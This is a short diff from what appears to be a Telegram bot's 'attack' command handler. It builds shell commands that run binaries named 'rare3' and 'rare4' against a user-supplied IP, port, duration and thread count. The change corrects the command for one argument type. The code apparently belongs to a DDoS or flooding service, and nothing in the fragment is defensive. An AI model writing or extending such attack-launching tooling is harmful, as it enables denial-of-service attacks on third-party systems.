@@ -672,7 +672,7 @@ async def attack(update: Update, context: CallbackContext):
 
     # Determine the attack command based on the argument type
     if argument_type == 3:
-        attack_command = f"3 {ip} {port} {duration}"
+        attack_command = f"./rare3 {ip} {port} {duration}"
     elif argument_type == 4:
         attack_command = f"./rare4 {ip} {port} {duration} {threads}"
     elif argument_type == 5:
